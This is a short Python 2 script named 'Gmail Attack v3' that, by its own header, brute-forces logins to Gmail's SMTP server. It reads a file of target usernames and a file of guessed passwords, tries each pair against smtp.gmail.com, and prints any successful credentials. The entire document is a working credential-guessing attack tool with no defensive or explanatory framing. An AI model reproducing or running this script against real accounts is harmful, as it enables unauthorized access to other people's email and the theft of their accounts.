# Program: Gmail Attack v3
# Purpose: Brute force smtp.gmail.com using a list of usernames and corresponding possible passwords
# Thumbheads


import smtplib
from array import *


smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

usernames = raw_input("Enter the target's file name: ")
passwfile = raw_input("Enter the password file name: ")

usernames = open(usernames, "r")
passwfile = open(passwfile, "r")

usernameArray = []
passwordArray = []

for password in passwfile:

    passwordArray.append(password)

for user in usernames:

    usernameArray.append(user)

for a in range (0,17):

    print "Username: %sPassword: %s" % (usernameArray[a], passwordArray[a])

    try:
        smtpserver.login(usernameArray[a], passwordArray[a])

        print "[+] Login Successful! Username: %s Password: %s" % (usernameArray[a],passwordArray[a])

    except smtplib.SMTPAuthenticationError:

            print "[!] Password Incorrect: %s" % passwordArray[a]
